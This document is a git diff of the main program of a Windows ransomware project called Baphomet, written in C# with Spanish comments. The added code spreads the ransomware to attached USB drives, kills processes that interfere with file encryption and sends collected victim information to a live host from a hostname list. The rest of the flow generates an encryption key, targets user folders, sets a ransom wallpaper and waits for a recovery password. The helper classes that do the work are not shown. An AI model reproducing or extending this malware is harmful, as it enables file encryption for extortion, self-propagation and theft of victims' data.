@@ -1,4 +1,5 @@
-﻿using Baphomet.Utilities;
+﻿using Baphomet.Models;
+using Baphomet.Utilities;
 using System;
 using System.IO;
 using System.Net;
@@ -10,45 +11,46 @@ namespace Baphomet
 {
     public class Program 
     {
-        [DllImport("user32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);
-
-        private const uint SPI_SETDESKWALLPAPER = 0x14;
-        private const uint SPIF_UPDATEINIFILE = 0x1;
-        private const uint SPIF_SENDWININICHANGE = 0x2;
-
         static void Main()
         {
             Cryptep cryptep = new Cryptep();
             Decrypt decrypt = new Decrypt();
             BackgroundPhoto photo = new BackgroundPhoto();
             NetInfo netInfo = new NetInfo();
+            Diagnostics diag = new Diagnostics();
 
             var key = cryptep.GenerateKey();
             var userName = Environment.UserName;
-
 
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
             var Dirs = new[] { "\\Downloads" };
             var  userDir = "C:\\Users\\" +userName;
 
-            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
-            {
-                var targetPath = userDir + Dirs[d];
-                cryptep.directoryRoad(targetPath, key);
-            }
+            var devicesLst = diag.GetUsbDevices();//Obtengo una lista de los usb conectados a la maquina.
+            if(devicesLst.Count != 0)
+                diag.AutoCopy(devicesLst);//Intento copiar mi ransomware en los usb.
+           
+            //Verifico y mato los procesos que puedan interferir con el cifrado de archivos. 
+            diag.CheckProccess();
+            //for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
+            //{
+            //    var targetPath = userDir + Dirs[d];
+            //    cryptep.directoryRoad(targetPath, key);
+            //}
+
             //Verifico si tengo conecxion a internet.
             var internetCheck = netInfo.CheckInternetConnection();
             if(internetCheck != false)
             {
                 //Obtengo la data de la victima una vez cifre todos los directorios.
                 var victimInfo = netInfo.GetVictimInfo();
+                var host = netInfo.HostName();//busco un host vivo en mi lista de hostnames.
+                if (host != "noLive")
+                    netInfo.SendData(victimInfo, host);
             }
-
             //Cambio el wallpaper Desktop
             var wallpaper = photo.imageBase64();
-            ChangeWallpaper(wallpaper,userDir);
+            photo.ChangeWallpaper(wallpaper,userDir);
 
             //Muestro el mensaje de alerta y espero el password de recuperacion.
             string password = Message();
@@ -60,27 +62,6 @@ namespace Baphomet
             }
 
         }//</main>
-
-        //Wallpaper method.
-        private static void ChangeWallpaper(string imagebase64, string dropPath)
-        {
-            byte[] imageBytes = Convert.FromBase64String(imagebase64);
-            MemoryStream ms = new MemoryStream(imageBytes, 0, imageBytes.Length);
-            ms.Write(imageBytes, 0, imageBytes.Length);
-
-            var myimage = ms.ToArray();
-            File.WriteAllBytes(dropPath+"\\bapho.jpg", myimage);
-
-            var filename = dropPath + "\\bapho.jpg";
-
-            uint flag = 0;
-            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
-                    0, filename, flag))
-            {
-                Console.WriteLine("Error");
-            }
-           
-        }//</changeImgage>
 
         //Console message.
         static string Message()
